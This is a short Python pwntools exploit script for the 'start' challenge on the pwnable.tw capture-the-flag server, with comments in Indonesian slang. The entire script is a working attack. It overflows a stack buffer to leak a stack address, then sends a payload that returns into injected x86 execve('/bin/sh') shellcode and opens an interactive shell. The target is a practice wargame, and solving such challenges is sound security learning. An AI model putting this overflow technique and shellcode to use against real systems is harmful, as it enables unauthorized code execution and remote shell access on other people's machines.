from pwn import *
import struct

#c = process('./start')
c = connect("chall.pwnable.tw", 10000)
def cari_alamat():
	alamat1 = p32(0x08048087)
	payload = "YUSTIANMASTAHDDDEEEE"+alamat1
	c.send(payload)
	c.recvuntil(":")
	stack = c.recv(4)
	print "[+] Alamat Stack = " + hex(u32(stack))
	return u32(stack)

buff = cari_alamat()
shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" #asolele woyy 
#shellcode = asm(shellcraft.linux.sh()) //gagal wae kimak!1!1!1!
payload = "YUSTIANMASTAHDDDEEEE"+p32(buff+20)+shellcode
print '[+] Payload = '+payload
c.send(payload)
c.interactive()
